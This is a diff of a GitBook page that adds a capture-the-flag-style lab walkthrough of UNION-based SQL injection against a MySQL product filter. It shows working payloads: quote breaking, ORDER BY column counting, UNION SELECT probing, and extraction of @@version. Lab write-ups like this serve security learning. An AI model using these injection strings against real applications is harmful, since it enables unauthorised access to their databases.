@@ -6,34 +6,102 @@ To solve the lab, display the database version string.
 
 ***
 
-Hacker
+Let's Start !!
+
+First We Visit The Website !!
 
 <figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-Hacker
+We Try To Inject Single Quote `'` To Break The Backend Query !!
+
+Our Backend Query Is This Below !!
+
+```
+SELECT name,description FROM products WHERE category = 'Gifts' 
+```
+
+When We Inject The Single Quote `'` Actually The Create Error In The SQL Query !!
+
+```
+SELECT name,description FROM products WHERE category = 'Gifts''
+```
 
 <figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-Hacker
+MySQL Comment Types !!
+
+| Syntax  | Meaning                 |
+| ------- | ----------------------- |
+| `--`    | comment (space zaroori) |
+| `#`     | comment                 |
+| `/* */` | block comment           |
+
+We Try To Inject `'#` To Check The Backend Query !!
+
+Our Backend Query Is This Below !!
+
+```
+SELECT name,description FROM products WHERE category = 'Gifts' 
+```
+
+When We Inject `'#` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!
+
+```
+SELECT name,description FROM products WHERE category = 'Gifts'#'
+```
 
 <figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Hacker
+**Finding Number of Columns**
+
+**Method – ORDER BY**
+
+```
+' ORDER BY 1#
+' ORDER BY 2#
+' ORDER BY 3#
+```
+
+If `ORDER BY 3` fails, query has 2 columns.
 
 <figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Hacker
+That `ORDER BY 3` fails, query has 2 columns.
+
+it's Mean We assume Right Backend Query They have only Two Columns First is `name` and Second is `description` !!
+
+```
+SELECT name,description FROM products WHERE category = 'Gifts'
+```
 
 <figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
-Hacker
+Let's We Use In Our Two Column Table !!
+
+```
+'UNION SELECT 'a','b'#
+```
+
+Our Backend Code Look's Like This After Injecting This Query !!
+
+```
+SELECT name,description FROM products WHERE category = 'Gifts'
+UNION
+SELECT 'a','b'
+```
+
+Then See If Our First and Second Both Column is String They Return No Error !!
 
 <figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
-Hacker
+Use the following payload to display the database version:
+
+```
+'UNION SELECT @@version,NULL#
+```
 
 <figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-Hacker
+They Return MySQL Version !!
 
 <figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
